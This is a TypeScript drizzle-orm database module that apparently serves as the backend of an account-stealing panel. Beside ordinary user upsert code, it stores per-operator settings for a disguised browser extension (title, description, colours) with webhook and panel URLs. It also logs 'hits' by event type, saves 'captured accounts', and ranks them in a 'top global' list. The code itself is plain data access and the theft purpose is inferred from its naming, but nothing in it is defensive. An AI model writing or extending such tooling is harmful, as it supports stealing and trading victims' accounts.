import { eq, desc, and, gte, lte, sql, count } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, hits, InsertHit, config, InsertConfig, capturedAccounts, InsertCapturedAccount } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// Configuration management
export async function saveConfig(data: InsertConfig) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  
  await db.insert(config).values(data).onDuplicateKeyUpdate({
    set: {
      webhookUrl: data.webhookUrl,
      panelUrl: data.panelUrl,
      extensionTitle: data.extensionTitle,
      extensionDescription: data.extensionDescription,
      extensionBackground: data.extensionBackground,
      extensionPrimaryColor: data.extensionPrimaryColor,
      updatedAt: new Date(),
    },
  });
}

export async function getConfigByUserId(userId: number) {
  const db = await getDb();
  if (!db) return undefined;
  
  const result = await db.select().from(config).where(eq(config.userId, userId)).limit(1);
  return result.length > 0 ? result[0] : undefined;
}

// Hits management
export async function createHit(data: InsertHit) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  
  await db.insert(hits).values(data);
}

export async function getRecentHits(limit: number = 100) {
  const db = await getDb();
  if (!db) return [];
  
  return await db.select().from(hits).orderBy(desc(hits.timestamp)).limit(limit);
}

export async function getHitsByDateRange(startDate: Date, endDate: Date) {
  const db = await getDb();
  if (!db) return [];
  
  return await db.select().from(hits)
    .where(and(gte(hits.timestamp, startDate), lte(hits.timestamp, endDate)))
    .orderBy(desc(hits.timestamp));
}

export async function getHitsByEventType(eventType: string) {
  const db = await getDb();
  if (!db) return [];
  
  return await db.select().from(hits).where(eq(hits.eventType, eventType as any)).orderBy(desc(hits.timestamp));
}

// Statistics
export async function getTotalHitsCount() {
  const db = await getDb();
  if (!db) return 0;
  
  const result = await db.select({ count: count() }).from(hits);
  return result[0]?.count ?? 0;
}

export async function getHitsCountByType() {
  const db = await getDb();
  if (!db) return [];
  
  return await db.select({
    eventType: hits.eventType,
    count: count()
  }).from(hits).groupBy(hits.eventType);
}

export async function getHitsCountByDate(days: number = 7) {
  const db = await getDb();
  if (!db) return [];
  
  const startDate = new Date();
  startDate.setDate(startDate.getDate() - days);
  
  return await db.select({
    date: sql<string>`DATE(${hits.timestamp})`,
    count: count()
  }).from(hits)
    .where(gte(hits.timestamp, startDate))
    .groupBy(sql`DATE(${hits.timestamp})`)
    .orderBy(sql`DATE(${hits.timestamp})`);
}

// Captured accounts
export async function createCapturedAccount(data: InsertCapturedAccount) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  
  await db.insert(capturedAccounts).values(data);
}

export async function getTopGlobal(limit: number = 10) {
  const db = await getDb();
  if (!db) return [];
  
  return await db.select().from(capturedAccounts)
    .orderBy(desc(capturedAccounts.summary))
    .limit(limit);
}

export async function getTotalCapturedAccountsCount() {
  const db = await getDb();
  if (!db) return 0;
  
  const result = await db.select({ count: count() }).from(capturedAccounts);
  return result[0]?.count ?? 0;
}

export async function getRecentCapturedAccounts(limit: number = 50) {
  const db = await getDb();
  if (!db) return [];
  
  return await db.select().from(capturedAccounts).orderBy(desc(capturedAccounts.capturedAt)).limit(limit);
}
